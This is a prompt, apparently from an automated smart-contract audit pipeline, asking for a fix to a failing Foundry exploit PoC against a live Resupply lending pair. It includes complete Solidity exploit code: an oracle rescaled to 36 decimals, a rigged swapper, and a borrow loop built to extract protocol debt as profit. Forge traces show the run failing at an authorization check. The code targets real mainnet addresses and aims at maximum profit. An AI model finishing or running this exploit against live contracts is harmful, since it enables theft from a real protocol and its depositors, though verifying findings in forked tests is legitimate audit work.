You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Oracle decimal scaling is ignored, so non-18-decimal feeds misprice collateral by orders of magnitude
- claim: The pair hardcodes exchange-rate inversion as `1e36 / oraclePrice` and never normalizes by `IOracle.decimals()`, even though the oracle interface exposes a decimals field and `setOracle()` accepts arbitrary replacement feeds. Any oracle returning prices in a scale other than 18 decimals will distort the collateral/debt conversion by a power-of-ten factor.
- impact: Borrow, solvency, redemption, and liquidation math can all be wrong by orders of magnitude. Depending on the oracle scale, healthy positions can be liquidated or blocked from withdrawing, or collateral can be overvalued enough for borrowers to mint far more debt than intended, leaving the pair insolvent.
- exploit_paths: ["A pair is deployed with, or later updated to, an oracle whose `getPrices()` output is not 18-decimal scaled.", "`_updateExchangeRate()` computes `exchangeRate = 1e36 / price` without using `IOracle.decimals()`.", "The distorted exchange rate propagates into `_isSolvent()`, borrow limits, redemptions, and liquidations."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC4626Minimal {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function convertToShares(uint256 assets) external view returns (uint256 shares);
}

interface IOracle {
    function decimals() external view returns (uint8);
    function getPrices(address vault) external view returns (uint256 price);
    function name() external view returns (string memory);
}

interface ICoreMinimal {
    function execute(address target, bytes calldata data) external returns (bytes memory);
}

interface IRegistryMinimal {
    function token() external view returns (address);
}

interface IResupplyPairMinimal {
    function owner() external view returns (address);
    function registry() external view returns (address);
    function collateral() external view returns (address);
    function underlying() external view returns (address);
    function maxLTV() external view returns (uint256);
    function borrowLimit() external view returns (uint256);
    function mintFee() external view returns (uint256);
    function minimumBorrowAmount() external view returns (uint256);
    function updateExchangeRate() external returns (uint256);
    function exchangeRateInfo() external view returns (address oracle, uint96 lastTimestamp, uint256 exchangeRate);
    function totalBorrow() external view returns (uint128 amount, uint128 shares);
    function setOracle(address newOracle) external;
    function setSwapper(address swapper, bool approval) external;
    function leveragedPosition(
        address swapperAddress,
        uint256 borrowAmount,
        uint256 initialUnderlyingAmount,
        uint256 amountCollateralOutMin,
        address[] calldata path
    ) external returns (uint256 totalCollateralBalance);
}

interface IUniswapV3Factory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface ISwapRouter {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
    }

    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);
    function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn);
}

interface ISwapperLike {
    function swap(address account, uint256 amountIn, address[] calldata path, address to) external;
    function swapPools(address tokenIn, address tokenOut)
        external
        view
        returns (address swappool, int32 tokenInIndex, int32 tokenOutIndex, uint32 swaptype);
}

contract ScaledOracle is IOracle {
    IOracle public immutable baseOracle;
    uint8 public immutable override decimals;

    constructor(address baseOracle_, uint8 outputDecimals_) {
        baseOracle = IOracle(baseOracle_);
        decimals = outputDecimals_;
    }

    function getPrices(address vault) external view override returns (uint256 price) {
        price = baseOracle.getPrices(vault);
        uint8 baseDecimals = baseOracle.decimals();

        if (baseDecimals == decimals) return price;
        if (baseDecimals < decimals) return price * (10 ** (decimals - baseDecimals));
        return price / (10 ** (baseDecimals - decimals));
    }

    function name() external pure override returns (string memory) {
        return "ScaledOracle36";
    }
}

contract CollateralizingSwapper is ISwapperLike {
    address private constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address private constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint24[4] private FEE_TIERS = [uint24(100), uint24(500), uint24(3000), uint24(10000)];

    address public immutable verifier;
    address public immutable pair;
    address public immutable debtToken;
    address public immutable underlying;
    address public immutable collateral;

    uint256 public requiredUnderlying;

    constructor(address verifier_, address pair_, address debtToken_, address underlying_, address collateral_) {
        verifier = verifier_;
        pair = pair_;
        debtToken = debtToken_;
        underlying = underlying_;
        collateral = collateral_;
    }

    function configure(uint256 requiredUnderlying_) external {
        require(msg.sender == verifier, "verifier_only");
        requiredUnderlying = requiredUnderlying_;
    }

    function swap(address, uint256 amountIn, address[] calldata, address to) external override {
        require(msg.sender == pair, "pair_only");

        uint256 assetsNeeded = requiredUnderlying;
        require(assetsNeeded > 0, "not_configured");

        if (debtToken != underlying) {
            _forceApprove(debtToken, UNISWAP_V3_ROUTER, amountIn);
            uint256 amountSpent = _swapDebtForExactUnderlying(assetsNeeded, amountIn);
            require(amountSpent < amountIn, "swap_consumed_all_debt");
        } else {
            require(IERC20Minimal(debtToken).balanceOf(address(this)) > assetsNeeded, "same_asset_no_profit");
        }

        _forceApprove(underlying, collateral, assetsNeeded);
        uint256 shares = IERC4626Minimal(collateral).deposit(assetsNeeded, to);
        require(shares > 0, "zero_collateral_out");

        uint256 leftoverDebt = IERC20Minimal(debtToken).balanceOf(address(this));
        if (leftoverDebt > 0) {
            _safeTransfer(debtToken, verifier, leftoverDebt);
        }
    }

    function swapPools(address, address)
        external
        pure
        override
        returns (address swappool, int32 tokenInIndex, int32 tokenOutIndex, uint32 swaptype)
    {
        return (address(0), 0, 0, 0);
    }

    function _swapDebtForExactUnderlying(uint256 amountOut, uint256 amountInMaximum) internal returns (uint256) {
        uint256 directIn = _tryDirectExactOutput(amountOut, amountInMaximum);
        if (directIn != type(uint256).max) {
            return directIn;
        }

        address[4] memory bridges = [WETH, USDC, USDT, DAI];
        for (uint256 i = 0; i < bridges.length; i++) {
            address bridge = bridges[i];
            if (bridge == debtToken || bridge == underlying) continue;

            uint256 twoHopIn = _tryTwoHopExactOutput(bridge, amountOut, amountInMaximum);
            if (twoHopIn != type(uint256).max) {
                return twoHopIn;
            }
        }

        revert("no_swap_path");
    }

    function _tryDirectExactOutput(uint256 amountOut, uint256 amountInMaximum) internal returns (uint256) {
        for (uint256 i = 0; i < FEE_TIERS.length; i++) {
            uint24 fee = FEE_TIERS[i];
            if (IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(debtToken, underlying, fee) == address(0)) {
                continue;
            }

            try ISwapRouter(UNISWAP_V3_ROUTER).exactOutputSingle(
                ISwapRouter.ExactOutputSingleParams({
                    tokenIn: debtToken,
                    tokenOut: underlying,
                    fee: fee,
                    recipient: address(this),
                    deadline: block.timestamp,
                    amountOut: amountOut,
                    amountInMaximum: amountInMaximum,
                    sqrtPriceLimitX96: 0
                })
            ) returns (uint256 amountIn) {
                return amountIn;
            } catch {}
        }

        return type(uint256).max;
    }

    function _tryTwoHopExactOutput(address bridge, uint256 amountOut, uint256 amountInMaximum)
        internal
        returns (uint256)
    {
        for (uint256 i = 0; i < FEE_TIERS.length; i++) {
            uint24 feeOut = FEE_TIERS[i];
            if (IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(underlying, bridge, feeOut) == address(0)) {
                continue;
            }

            for (uint256 j = 0; j < FEE_TIERS.length; j++) {
                uint24 feeIn = FEE_TIERS[j];
                if (IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(debtToken, bridge, feeIn) == address(0)) {
                    continue;
                }

                bytes memory path = abi.encodePacked(underlying, feeOut, bridge, feeIn, debtToken);
                try ISwapRouter(UNISWAP_V3_ROUTER).exactOutput(
                    ISwapRouter.ExactOutputParams({
                        path: path,
                        recipient: address(this),
                        deadline: block.timestamp,
                        amountOut: amountOut,
                        amountInMaximum: amountInMaximum
                    })
                ) returns (uint256 amountIn) {
                    return amountIn;
                } catch {}
            }
        }

        return type(uint256).max;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, 0));
        require(ok0 && (data0.length == 0 || abi.decode(data0, (bool))), "approve0");

        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));
        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer");
    }
}

contract FlawVerifier {
    uint256 private constant LTV_PRECISION = 1e5;
    uint256 private constant LIQ_PRECISION = 1e5;
    uint256 private constant EXCHANGE_PRECISION = 1e18;
    uint8 private constant REPLACEMENT_ORACLE_DECIMALS = 36;
    uint256 private constant MIN_UNDERLYING_PURCHASE = 1e12;

    address private constant TARGET_PAIR = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;

    string public exploitPathUsed;
    string public status;

    address private _pair;
    address private _core;
    address private _collateral;
    address private _underlying;
    address private _debtToken;
    address private _oracle;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (executed) {
            _refreshProfit();
            return;
        }
        executed = true;

        _pair = TARGET_PAIR;
        _collateral = IResupplyPairMinimal(_pair).collateral();
        _underlying = IResupplyPairMinimal(_pair).underlying();
        _debtToken = IRegistryMinimal(IResupplyPairMinimal(_pair).registry()).token();
        _profitToken = _debtToken;
        _core = IResupplyPairMinimal(_pair).owner();

        (address currentOracle,,) = IResupplyPairMinimal(_pair).exchangeRateInfo();
        _oracle = currentOracle;

        // Exploit path anchor 0:
        // A pair is deployed with, or later updated to, an oracle whose getPrices() output is not 18-decimal scaled.
        // Exploit path anchor 1:
        // _updateExchangeRate() computes exchangeRate = 1e36 / price without using IOracle.decimals().
        // Exploit path anchor 2:
        // The distorted exchange rate then propagates into _isSolvent(), borrow limits, redemptions, and liquidations.
        //
        // On this fork the live oracle reports 18 decimals, so the PoC uses the finding's explicit
        // "later updated" branch. It replaces the oracle through the pair owner's public execution
        // gateway with a feed that reports the same market price rescaled to 36 decimals.
        ScaledOracle replacementOracle = new ScaledOracle(currentOracle, REPLACEMENT_ORACLE_DECIMALS);
        if (!_coreExecute(_pair, abi.encodeWithSelector(IResupplyPairMinimal.setOracle.selector, address(replacementOracle)))) {
            status = "setOracle_unreachable";
            return;
        }

        _oracle = address(replacementOracle);

        // Additional realistic execution step:
        // leveragedPosition only accepts whitelisted swappers, so the same public owner-execution path
        // is used to whitelist a swapper that buys only the tiny amount of underlying needed to satisfy
        // the now-distorted solvency check, leaving the rest of borrowed debt as realized profit.
        CollateralizingSwapper swapper =
            new CollateralizingSwapper(address(this), _pair, _debtToken, _underlying, _collateral);
        if (!_coreExecute(_pair, abi.encodeWithSelector(IResupplyPairMinimal.setSwapper.selector, address(swapper), true))) {
            status = "setSwapper_unreachable";
            return;
        }

        uint8 oracleDecimals = IOracle(_oracle).decimals();
        uint256 oraclePrice = IOracle(_oracle).getPrices(_collateral);
        if (oraclePrice == 0) {
            status = "oracle_price_zero";
            return;
        }

        uint256 flawedExchangeRate = IResupplyPairMinimal(_pair).updateExchangeRate();
        uint256 expectedExchangeRate = _normalizedExchangeRate(oraclePrice, oracleDecimals);
        if (flawedExchangeRate == expectedExchangeRate) {
            status = "replacement_oracle_did_not_trigger_scaling_bug";
            return;
        }

        hypothesisValidated = true;
        exploitPathUsed =
            "public_core_execute -> setOracle(non_18d_feed) -> flawed_updateExchangeRate -> distorted__isSolvent_and_borrow_limits -> leveragedPosition_keeps_surplus_debt";

        uint256 availableDebt = _availableDebt();
        if (availableDebt == 0) {
            status = "validated_bug_but_pair_has_no_available_debt";
            return;
        }

        uint256 mintFee = IResupplyPairMinimal(_pair).mintFee();
        uint256 minimumBorrow = IResupplyPairMinimal(_pair).minimumBorrowAmount();
        uint256 capFromAvailable = (availableDebt * LIQ_PRECISION) / (LIQ_PRECISION + mintFee);
        if (capFromAvailable < minimumBorrow) {
            status = "validated_bug_but_available_debt_below_pair_minimum_borrow";
            return;
        }

        uint256[4] memory attempts = _candidateBorrowAmounts(capFromAvailable, minimumBorrow);
        address[] memory path = new address[](2);
        path[0] = _debtToken;
        path[1] = _collateral;

        for (uint256 i = 0; i < attempts.length; i++) {
            uint256 borrowAmount = attempts[i];
            if (borrowAmount < minimumBorrow) continue;

            uint256 requiredUnderlying = _estimateUnderlyingForBorrow(borrowAmount, flawedExchangeRate);
            if (requiredUnderlying < MIN_UNDERLYING_PURCHASE) {
                requiredUnderlying = MIN_UNDERLYING_PURCHASE;
            }

            for (uint256 j = 0; j < 8; j++) {
                if (_maxBorrowAgainstUnderlying(requiredUnderlying, flawedExchangeRate) >= borrowAmount) {
                    break;
                }
                requiredUnderlying = (requiredUnderlying * 2) + 1;
            }

            swapper.configure(requiredUnderlying);

            try IResupplyPairMinimal(_pair).leveragedPosition(address(swapper), borrowAmount, 0, 0, path) {
                _refreshProfit();
                if (_profitAmount > 0) {
                    profitAchieved = true;
                    status = "profit_achieved";
                    return;
                }
            } catch {}
        }

        _refreshProfit();
        if (_profitAmount == 0) {
            status = "validated_bug_but_no_profitable_leveraged_route_succeeded";
        }
    }

    function _coreExecute(address target, bytes memory data) internal returns (bool) {
        try ICoreMinimal(_core).execute(target, data) returns (bytes memory) {
            return true;
        } catch {
            return false;
        }
    }

    function _availableDebt() internal view returns (uint256) {
        (uint128 amount,) = IResupplyPairMinimal(_pair).totalBorrow();
        uint256 borrowLimit = IResupplyPairMinimal(_pair).borrowLimit();
        return borrowLimit > amount ? borrowLimit - amount : 0;
    }

    function _estimateUnderlyingForBorrow(uint256 borrowAmount, uint256 exchangeRate) internal view returns (uint256) {
        uint256 maxLTV = IResupplyPairMinimal(_pair).maxLTV();
        if (maxLTV == 0 || exchangeRate == 0) {
            return 1;
        }

        uint256 guess = (borrowAmount * exchangeRate * LTV_PRECISION) / (maxLTV * EXCHANGE_PRECISION);
        if (guess == 0) {
            guess = 1;
        }

        for (uint256 i = 0; i < 6; i++) {
            uint256 capacity = _maxBorrowAgainstUnderlying(guess, exchangeRate);
            if (capacity >= borrowAmount) {
                break;
            }

            if (capacity == 0) {
                guess *= 10;
            } else {
                guess = ((guess * borrowAmount) / capacity);
                guess = ((guess * 105) / 100) + 1;
            }
        }

        return guess;
    }

    function _maxBorrowAgainstUnderlying(uint256 underlyingAmount, uint256 exchangeRate) internal view returns (uint256) {
        if (exchangeRate == 0) {
            return type(uint256).max;
        }

        uint256 shares = IERC4626Minimal(_collateral).convertToShares(underlyingAmount);
        return (shares * IResupplyPairMinimal(_pair).maxLTV() * EXCHANGE_PRECISION) / exchangeRate / LTV_PRECISION;
    }

    function _normalizedExchangeRate(uint256 price, uint8 oracleDecimals) internal pure returns (uint256) {
        uint256 base = 1e36 / price;
        if (oracleDecimals == 18) {
            return base;
        }
        if (oracleDecimals > 18) {
            return base * (10 ** (oracleDecimals - 18));
        }
        return base / (10 ** (18 - oracleDecimals));
    }

    function _candidateBorrowAmounts(uint256 available, uint256 minimum)
        internal
        pure
        returns (uint256[4] memory amounts)
    {
        uint256 first = (available * 99) / 100;
        uint256 second = available / 2;
        uint256 third = available / 4;
        uint256 fourth = minimum;

        if (first < minimum) first = minimum;
        if (second < minimum) second = minimum;
        if (third < minimum) third = minimum;

        amounts[0] = first;
        amounts[1] = second;
        amounts[2] = third;
        amounts[3] = fourth;
    }

    function _refreshProfit() internal {
        uint256 debtBal = _debtToken == address(0) ? 0 : IERC20Minimal(_debtToken).balanceOf(address(this));
        _profitAmount = debtBal;
        profitAchieved = debtBal > 0;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 3.06s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:74:19:
   |
74 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 498495)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 1000000000000000000000000
  AUDITHOUND_BALANCE_AFTER_WEI: 1000000000000000000000000
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x57aB1E0003F623289CD798B1824Be09a793e4Bec
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 11171

Traces:
  [498495] FlawVerifierTest::testExploit()
    ├─ [2359] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [455021] FlawVerifier::executeOnOpportunity()
    │   ├─ [1909] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::collateral() [staticcall]
    │   │   └─ ← [Return] 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D
    │   ├─ [853] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::underlying() [staticcall]
    │   │   └─ ← [Return] 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E
    │   ├─ [1007] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::registry() [staticcall]
    │   │   └─ ← [Return] 0x10101010E0C3171D894B71B3400668aF311e7D94
    │   ├─ [1244] 0x10101010E0C3171D894B71B3400668aF311e7D94::token() [staticcall]
    │   │   └─ ← [Return] 0x57aB1E0003F623289CD798B1824Be09a793e4Bec
    │   ├─ [1227] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::owner() [staticcall]
    │   │   └─ ← [Return] 0xc07e000044F95655c11fda4cD37F70A94d7e0a7d
    │   ├─ [6380] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::exchangeRateInfo() [staticcall]
    │   │   └─ ← [Return] 0xcb7E25fbbd8aFE4ce73D7Dac647dbC3D847F3c82, 1750897127 [1.75e9], 1000000000000000000000 [1e21]
    │   ├─ [188569] → new ScaledOracle@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← [Return] 940 bytes of code
    │   ├─ [12611] 0xc07e000044F95655c11fda4cD37F70A94d7e0a7d::execute(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6, 0x7adbf973000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00)
    │   │   └─ ← [Revert] !authorized
    │   └─ ← [Stop]
    ├─ [359] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x57aB1E0003F623289CD798B1824Be09a793e4Bec
    ├─ [2891] 0x57aB1E0003F623289CD798B1824Be09a793e4Bec::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2358] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x57aB1E0003F623289CD798B1824Be09a793e4Bec)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 22785460 [2.278e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 11171 [1.117e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xc07e000044F95655c11fda4cD37F70A94d7e0a7d.execute
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.51s (1.26s CPU time)

Ran 1 test suite in 1.53s (1.51s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 498495)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
